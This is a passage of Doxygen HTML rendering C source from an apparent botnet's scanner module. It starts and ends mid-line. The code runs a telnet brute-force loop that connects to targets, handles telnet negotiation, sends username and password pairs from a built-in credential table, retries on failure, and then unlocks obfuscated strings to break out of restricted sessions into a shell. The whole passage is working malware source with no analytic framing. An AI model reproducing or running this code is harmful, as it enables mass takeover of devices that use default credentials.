href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a>) == 10)</div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;                    {</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;                        conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a> = 0;</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;                        conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;                    }</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;                    <span class="keywordflow">else</span></div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;                    {</div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;                        <a class="code" href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a>(conn);</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;                        printf(<span class="stringliteral">&quot;[scanner] FD%d retrying with different auth combo!\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;                    }</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;                }</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;                {</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a> = 0;</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;                }</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;            }</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> == <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa00fef5111c635b0656496fc72b109909">SC_CONNECTING</a>)</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;            {</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, &amp;fdset_wr);</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> &gt; mfd_wr)</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;                    mfd_wr = conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>;</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;            }</div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> != <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>)</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;            {</div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, &amp;fdset_rd);</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> &gt; mfd_rd)</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;                    mfd_rd = conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>;</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;            }</div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;        }</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160;</div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;        tim.tv_usec = 0;</div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;        tim.tv_sec = 1;</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;        nfds = select(1 + (mfd_wr &gt; mfd_rd ? mfd_wr : mfd_rd), &amp;fdset_rd, &amp;fdset_wr, NULL, &amp;tim);</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;        fake_time = time(NULL);</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;</div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a>; i++)</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;        {</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;            conn = &amp;conn_table[i];</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;</div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> == -1)</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;</div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;            <span class="keywordflow">if</span> (FD_ISSET(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, &amp;fdset_wr))</div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;            {</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;                <span class="keywordtype">int</span> err = 0, ret = 0;</div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;                socklen_t err_len = <span class="keyword">sizeof</span> (err);</div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;                ret = getsockopt(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, SOL_SOCKET, SO_ERROR, &amp;err, &amp;err_len);</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;                <span class="keywordflow">if</span> (err == 0 &amp;&amp; ret == 0)</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;                {</div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa3249bd9668855185501733f9bef09acf">SC_HANDLE_IACS</a>;</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a> = <a class="code" href="scanner_8h.html#a8b83be662fc81c21cc28445b9154176c">random_auth_entry</a>();</div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> = 0;</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;                    printf(<span class="stringliteral">&quot;[scanner] FD%d connected. Trying %s:%s\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#a6c84dac1e6b150aa887557303905d350">username</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#a6bb9828bf02ee7f1305fc8bdd3a059c5">password</a>);</div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;                }</div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;                {</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;                    printf(<span class="stringliteral">&quot;[scanner] FD%d error while connecting = %d\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, err);</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;                    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a> = 0;</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                    <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;                }</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;            }</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;            <span class="keywordflow">if</span> (FD_ISSET(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, &amp;fdset_rd))</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;            {</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                {</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;                    <span class="keywordtype">int</span> ret;</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;</div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;                    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> == <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>)</div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;</div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;                    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> == <a class="code" href="scanner_8h.html#a001f7782e8f74809d4ccfa093bc7e01f">SCANNER_RDBUF_SIZE</a>)</div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                    {</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                        memmove(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a> + <a class="code" href="scanner_8h.html#abe3044a3b818d1ea8d557651f569cf91">SCANNER_HACK_DRAIN</a>, <a class="code" href="scanner_8h.html#a001f7782e8f74809d4ccfa093bc7e01f">SCANNER_RDBUF_SIZE</a> - <a class="code" href="scanner_8h.html#abe3044a3b818d1ea8d557651f569cf91">SCANNER_HACK_DRAIN</a>);</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                        conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> -= <a class="code" href="scanner_8h.html#abe3044a3b818d1ea8d557651f569cf91">SCANNER_HACK_DRAIN</a>;</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;                    }</div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;                    errno = 0;</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;                    ret = recv_strip_null(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a> + conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, <a class="code" href="scanner_8h.html#a001f7782e8f74809d4ccfa093bc7e01f">SCANNER_RDBUF_SIZE</a> - conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                    <span class="keywordflow">if</span> (ret == 0)</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                    {</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                        printf(<span class="stringliteral">&quot;[scanner] FD%d connection gracefully closed\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                        errno = ECONNRESET;</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                        ret = -1; <span class="comment">// Fall through to closing connection below</span></div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                    }</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                    <span class="keywordflow">if</span> (ret == -1)</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;                    {</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;                        <span class="keywordflow">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK)</div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                        {</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                            printf(<span class="stringliteral">&quot;[scanner] FD%d lost connection\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                            <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                            conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;                            <span class="comment">// Retry</span></div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                            <span class="keywordflow">if</span> (++(conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a>) &gt;= 10)</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                            {</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a> = 0;</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;                            }</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;                            {</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                                <a class="code" href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a>(conn);</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d retrying with different auth combo!\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;                            }</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                        }</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                    }</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> += ret;</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;                    conn-&gt;<a class="code" href="structscanner__connection.html#a404ba23e26531c9e469151220f2b8c5b">last_recv</a> = fake_time;</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;                    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;                    {</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;                        <span class="keywordtype">int</span> consumed = 0;</div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;                        <span class="keywordflow">switch</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a>)</div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                        {</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa3249bd9668855185501733f9bef09acf">SC_HANDLE_IACS</a>:</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#ae996c08c3150fc2db37f09479843eb82">consume_iacs</a>(conn)) &gt; 0)</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;                            {</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfae53fa3b34bf74719c85bdff3b7988228">SC_WAITING_USERNAME</a>;</div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d finished telnet negotiation\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;                            }</div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfae53fa3b34bf74719c85bdff3b7988228">SC_WAITING_USERNAME</a>:</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a5cec20bfe7b1203987fc68744b51b46a">consume_user_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;                            {</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#a6c84dac1e6b150aa887557303905d350">username</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#a57891f0877155a744c8aae3d700bcb0e">username_len</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa7cf97e275b1f362c925bbbca8879cb19">SC_WAITING_PASSWORD</a>;</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received username prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;                            }</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa7cf97e275b1f362c925bbbca8879cb19">SC_WAITING_PASSWORD</a>:</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a47b695dfa82350e16fa161fb30e3af0d">consume_pass_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;                            {</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received password prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;                                <span class="comment">// Send password</span></div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#a6bb9828bf02ee7f1305fc8bdd3a059c5">password</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>-&gt;<a class="code" href="structscanner__auth.html#aeaed9effc2bdafc88641e686b2580d9d">password_len</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa57cdd909acfa73d78890a49b7d9db9ab">SC_WAITING_PASSWD_RESP</a>;</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;                            }</div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa57cdd909acfa73d78890a49b7d9db9ab">SC_WAITING_PASSWD_RESP</a>:</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;                            {</div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00490"></a><span class="lineno">  490</span>&#160;</div><div class="line"><a name="l00491"></a><span class="lineno">  491</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00492"></a><span class="lineno">  492</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received shell prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00493"></a><span class="lineno">  493</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00494"></a><span class="lineno">  494</span>&#160;</div><div class="line"><a name="l00495"></a><span class="lineno">  495</span>&#160;                                <span class="comment">// Send enable / system / shell / sh to session to drop into shell if needed</span></div><div class="line"><a name="l00496"></a><span class="lineno">  496</span>&#160;                                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a577985acedbf4e923d0fb33980a3ed0d">TABLE_SCAN_ENABLE</a>);</div><div class="line"><a name="l00497"></a><span class="lineno">  497</span>&#160;                                tmp_str = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" 